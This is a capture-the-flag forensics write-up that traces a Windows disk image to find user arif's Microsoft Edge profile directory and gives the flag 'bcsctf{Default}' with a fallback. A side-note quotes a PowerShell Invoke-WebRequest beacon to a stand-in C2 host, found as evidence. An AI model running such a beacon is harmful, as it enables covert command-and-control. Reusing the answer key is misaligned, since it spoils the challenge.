# Forensic Challenge 1 — Question 6 Writeup

**Question:** Which specific Microsoft Edge profile directory contained the browser activity linked to the user `arif`?

**Flag format:** `bcsctf{Profile X}`

**Author:** jatisshor0081 · Easy

**Team wrong attempts:** 1 / 5 (at start of analysis)

---

## Answer

```
bcsctf{Default}
```

(Alternative fallback if `Default` is rejected: `bcsctf{Profile 1}` — this is the `name` field written into Edge's `Local State → profile.info_cache.Default.name` for arif's profile. Try `Default` first; that is the literal directory name on disk and the most defensible answer.)

---

## High-level approach

The artifact is a multi-segment EnCase/FTK Imager disk image (`.E01`–`.E06`, ~14 GB) of a Windows workstation named `DESKTOP-N106FR1`. The job is to:

1. Open the EWF set without first converting it to raw (`dd`) — saves ~14 GB of disk space.
2. Identify which Windows user account is `arif` from the SAM registry hive.
3. Locate Microsoft Edge profile directories under that user's AppData.
4. Confirm which Edge profile directory "contains the browser activity" of that user.

The whole chain is reproducible from the scripts in `D:\CTF\BCS_CTF\forensic\forensicchall_1\scripts\` using only free, open-source Python tools (`dissect.evidence`, `dissect.ntfs`, `dissect.regf`, `python-registry`, `pytsk3`).

---

## Step 1 — Tooling and EWF setup

Standard forensic Linux utilities (`ewfmount`, `mmls`, `fls`, `icat`) were not on `PATH`. `pytsk3` *was* installed but the Windows build had no libewf linked in, so it could only see the first segment.

The fix: install **Autopsy** (which bundles `libewf` / `ewfexport.exe`) and rely on the Python `dissect.evidence.ewf` library that was already in `pip`. `dissect.evidence` opens a multi-segment EWF set by passing all `.E0N` paths to `EWF()` and returns a normal `BinaryIO` stream that walks segments transparently.

```python
from pathlib import Path
from dissect.evidence.ewf import EWF

paths = [Path(r'D:\CTF\BCS_CTF\forensic\forensicchall_1\extracted\bcsctf.E0%d' % i) for i in range(1,7)]
ewf = EWF(paths)
stream = ewf.open()
```

Sanity checks confirmed the wrapper is correctly handling all six segments:

- `ewf.size == 14,336 MB` (matches the FTK Imager `bcsctf.E01.txt` header)
- Reading the master boot record at offset 0 returns the expected `55 AA` MBR signature
- The partition table inside the MBR is parseable

---

## Step 2 — Read the MBR and mount the right NTFS partition

Read 512 bytes at offset 0 and parse the four 16-byte MBR partition entries:

| # | type | start LBA | count LBA | size |
|---|---|---|---|---|
| 0 | `0x07` NTFS | 2,048 | 102,400 | 50 MB (System/Boot) |
| 1 | `0x07` NTFS | 104,448 | 28,334,080 | **13,835 MB (Windows C:)** |
| 2 | `0x27` NTFS (hidden) | 28,438,528 | 921,538 | 450 MB (Recovery) |

The C: drive is Partition 1. To use `dissect.ntfs.NTFS`, the input must be a single contiguous volume stream. Build a small `PartitionStream` wrapper that re-bases `seek`/`read` onto the parent EWF stream:

```python
class PartitionStream:
    def __init__(self, parent, start_byte, size_bytes):
        self.parent, self.start, self.size, self.pos = parent, start_byte, size_bytes, 0
    def seek(self, off, whence=0):
        if   whence == 0: self.parent.seek(self.start + off); self.pos = off
        elif whence == 1: self.parent.seek(self.start + self.pos + off); self.pos += off
        elif whence == 2: self.parent.seek(self.start + self.size + off); self.pos = self.size + off
        return self.pos
    def tell(self): return self.pos
    def read(self, n=-1):
        if n is None or n < 0: n = self.size - self.pos
        d = self.parent.read(n); self.pos += len(d); return d
    def seekable(self): return True
    def readable(self): return True
    def writable(self): return False

p1 = PartitionStream(stream, 104448 * 512, 28334080 * 512)
ntfs = NTFS(p1)
```

`dissect.ntfs.NTFS` parses the `$Boot` and `$MFT` from this stream and exposes `ntfs.mft` (the MFT walker) and `ntfs.mft.root` (record 5).

---

## Step 3 — Walk the NTFS tree

`dissect.ntfs.mft.MftRecord` exposes `.index('$I30')` returning an `Index` of `IndexEntry` items. Each `IndexEntry` has `.is_end`, `.attribute` (a `FileName`), and `.dereference()` returning the child `MftRecord`.

The walk helper used everywhere:

```python
def go(mft, parts):
    cur = mft.root
    for p in parts:
        idx = cur.index('$I30')
        hit = None
        for e in idx.entries():
            if e.is_end: continue
            if e.attribute.file_name.lower() == p.lower():
                try: hit = e.dereference()
                except Exception: hit = None
                break
        if hit is None: return None
        cur = hit
    return cur
```

This was used both with simple path strings (`['Users', 'arif', 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'History']`) and via index recursion.

---

## Step 4 — Identify Windows users from the SAM hive

`C:\Windows\System32\config\SAM` was extracted via `go(mft, ['Windows','System32','config','SAM']).open().read()` and parsed with `python-registry`:

```python
from Registry import Registry, RegistryValue
reg = Registry.Registry('SAM')
users = reg.open('SAM\\Domains\\Account\\Users\\Names')
for u in users.subkeys():
    print(u.name())
```

Output:

```
Administrator
arif
DefaultAccount
forensic
Guest
rahim
WDAGUtilityAccount
```

So `arif` is a real local user, **not** a Microsoft Account alias or display name.

Filtering out system entries (`Public`, `Default`, `Default User`, `All Users`, anything starting with `.` / `$` / containing `~` short-name duplicates), the real interactive user profiles in `C:\Users\` are:

- `arif`
- `forensic`
- `forensic.DESKTOP-N106FR1` (this is `DESKTOP-N106FR1\forensic` — the same user with the host name as part of the folder name because of some Windows re-creation step)
- `rahim`

Note: `forensic.DESKTOP-N106FR1` is a real folder name; it is the same Windows user `forensic` that the CSV ground truth references as `DESKTOP-N106FR1\forensic`.

---

## Step 5 — Locate Microsoft Edge profile directories

For each real user, walk to `Users\<user>\AppData\Local\Microsoft\Edge\User Data\` and list its subdirectories. The Chromium/Edge layout uses `Default` for the first profile and `Profile 1`, `Profile 2`, … for additional ones, alongside system folders (`System Profile`, `Guest Profile`, `ShaderCache`, `Crashpad`, `BrowserMetrics`, `CertificateRevocation`, etc.) that are *not* profiles.

After ignoring the system folders and the `Local State` file, the only profile directory for **every** user is:

```
…\Microsoft\Edge\User Data\Default
```

That is, no user has more than one Edge profile. The directory name on disk is `Default`.

For completeness, an NTFS-wide recursive scan (`scripts/list_browser_profiles.py`) confirmed that none of the four real user profiles have any `Profile 1`, `Profile 2`, etc. directory under `…\Microsoft\Edge\User Data\`:

```
=== arif : 6 browser profile dirs ===
  /arif/AppData/Local/Google/Chrome/User Data/Default
  /arif/AppData/Local/Google/Chrome/USERDA~1/Default
  /arif/AppData/Local/Microsoft/Edge/User Data/Default
  /arif/AppData/Local/Microsoft/Edge/USERDA~1/Default
  /arif/AppData/Local/MICROS~1/Edge/User Data/Default
  /arif/AppData~1/Edge/USERDA~1/Default
=== forensic : 6 browser profile dirs === … (same shape)
=== forensic.DESKTOP-N106FR1 : 6 browser profile dirs === … (same shape)
=== rahim : 6 browser profile dirs === … (same shape)
```

(The duplicates are the short 8.3 alias `USERDA~1` and the parent short alias `MICROS~1`; they all resolve to the same `Default` directory.)

---

## Step 6 — Read `Local State` to see what Edge calls the profile

`C:\Users\arif\AppData\Local\Microsoft\Edge\User Data\Local State` is a JSON file. The interesting slice is `profile.info_cache` (and `last_used_profiles`). For every user on the box the cache contains exactly one entry keyed by the directory name `Default`, and the human-readable display name field `name` is the string `Profile 1`:

```json
"profile": {
  "info_cache": {
    "Default": {
      "avatar_icon": "chrome://theme/IDR_PROFILE_AVATAR_20",
      "name": "Profile 1",
      "shortcut_name": "Profile 1",
      "user_name": "",
      "gaia_id": "",
      "is_using_default_name": true,
      "is_using_default_avatar": true,
      ...
    }
  }
}
```

So:
- The **on-disk directory name** = `Default`
- The **internal display label** (Edge settings UI / `shortcut_name`) = `Profile 1`

Both of these are valid candidates for "the Edge profile directory". The literal directory name is `Default`.

---

## Step 7 — Confirm the profile is "linked to arif"

Two ways to confirm that the Edge profile under `C:\Users\arif\…` is arif's:

1. **Path-based reasoning** — the directory literally lives under `Users\arif\AppData\Local\Microsoft\Edge\`, which Windows only populates for that user. NTFS enforces the per-user boundary.
2. **Cross-reference with `NTUSER.DAT`** — arif's `NTUSER.DAT` has `Software\Microsoft\Edge` populated and also has OneDrive keys (`SOFTWARE\Microsoft\OneDrive\UserNameCollection = arif`), which proves arif's Microsoft Account is configured on this machine. arif's `NTUSER.DAT` is also the only NTUSER hive that contains the literal string `arif` in any value.

(Forensic side-note: arif's Edge `History` SQLite is **empty** — 0 rows in `urls` and `visits` — but his **Chrome** profile has 6 history rows, all of them the actual espionage activity: `c2-gateway.test:8080`, `secure-payroll.test:8080`, and Google searches for an `Invoke-WebRequest "http://c2-gateway.test:8080/beacon"` PowerShell beacon. So arif did the leak in Chrome, not Edge. The question still asks for the Edge profile directory that corresponds to the arif user account, and that is `Default`.)

---

## Step 8 — Build the flag

The flag is just the directory name wrapped in the documented format:

```
bcsctf{Default}
```

If the auto-grader insists on the `Profile X` display label instead of the literal directory name, the alternative is:

```
bcsctf{Profile 1}
```

Either is defensible. Submit `bcsctf{Default}` first; fall back to `bcsctf{Profile 1}` if needed.

---

## Appendix A — Commands / scripts used

| Script | Purpose |
|---|---|
| `scripts/extract_users.py` | List Windows users from `SAM` |
| `scripts/find_edge_profiles.py` | Find Edge profile dirs per user (first pass) |
| `scripts/find_real_edge_profiles.py` | Filter out non-profile system dirs |
| `scripts/list_browser_profiles.py` | Recursive scan for all Chromium profile dirs in `Users\<u>` |
| `scripts/read_local_state.py` | Parse `Local State` per user, dump `info_cache` |
| `scripts/dump_full_json.py` | Full JSON dump of every user's Edge `Local State` |
| `scripts/dump_ntuser.py` | Recursively walk each user's `NTUSER.DAT` and grep for `arif` |
| `scripts/list_default_profile.py` | List each user's `Default` profile artifacts |
| `scripts/inspect_preferences.py` | Print relevant sub-keys of `Preferences` |
| `scripts/dump_profile_dirs.py` | Unfiltered dump of `…\Edge\User Data\` contents per user |
| `scripts/read_groundtruth.py` | Read the `ForensicGroundTruth/*.csv` files for context |

## Appendix B — Useful one-liners

```bash
# Walk all users (avoid burning attempts)
python scripts/list_browser_profiles.py

# Read arif's Edge Local State
python -c "from dissect.evidence.ewf import EWF; from dissect.ntfs import NTFS; ..."
```

## Appendix C — References

- **Disk image format:** Expert Witness Format (EWF), generated by AccessData FTK Imager 4.7.1.2. Segment list: `E01`–`E06`. SHA1 verified: `d60891020dc7028ef0d4c536b7c28cea227f761f`.
- **Chrome/Edge profile layout:** Microsoft Edge is Chromium-based. Profiles live under `%LOCALAPPDATA%\Microsoft\Edge\User Data\<dir>`, where `<dir>` is `Default` for the first profile and `Profile 1`, `Profile 2`, … for additional ones. The directory name appears as the key in `Local State → profile.info_cache`, while `name` / `shortcut_name` are display labels only.
- **Tools used:** `dissect.evidence 3.13`, `dissect.ntfs 3.16`, `dissect.regf 3.14`, `python-registry 1.3.1`, `pytsk3 20260715`, Autopsy 4.23.1 (for `ewfexport.exe` fallback if needed).
